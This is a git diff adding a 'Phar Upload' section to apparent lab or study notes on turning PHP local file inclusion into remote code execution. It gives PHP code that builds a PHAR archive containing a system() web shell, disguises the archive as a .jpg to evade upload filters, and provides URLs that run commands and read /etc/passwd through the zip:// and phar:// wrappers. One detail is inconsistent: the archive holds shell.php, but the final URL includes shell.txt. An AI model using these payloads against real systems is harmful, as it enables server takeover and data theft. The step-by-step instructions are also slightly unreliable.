@@ -486,3 +486,47 @@ http://94.237.55.43:48679/index.php?language=zip://./profile_images/shell.jpg%23
 ```bash
 http://94.237.61.242:42157/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=cd+../../../;cat+/etc/passwd
 ```
+
+---
+
+### Phar Upload
+
+A **PHAR** archive can be used to achieve RCE when combined with an LFI vulnerability by leveraging the `phar://` wrapper. PHP treats files inside a PHAR archive as regular files, allowing PHP code stored within the archive to be included and executed.
+
+This technique requires:
+- PHP PHAR support (enabled by default)
+- The application to include files using `include()` or `require()`
+
+**Step 1:**
+
+Create a PHAR archive containing a PHP web shell:
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.php', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+```
+
+**Step 2:**
+
+Compile the PHAR archive and rename it to bypass upload filters:
+
+```bash
+php --define phar.readonly=0 shell.php
+mv shell.phar shell.jpg
+```
+
+**Step 3:**
+
+Upload the file and include the embedded PHP file via the `phar://` wrapper:
+
+```bash
+http://94.237.61.242:42157/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
+
+---
+
+## Log Poisoning
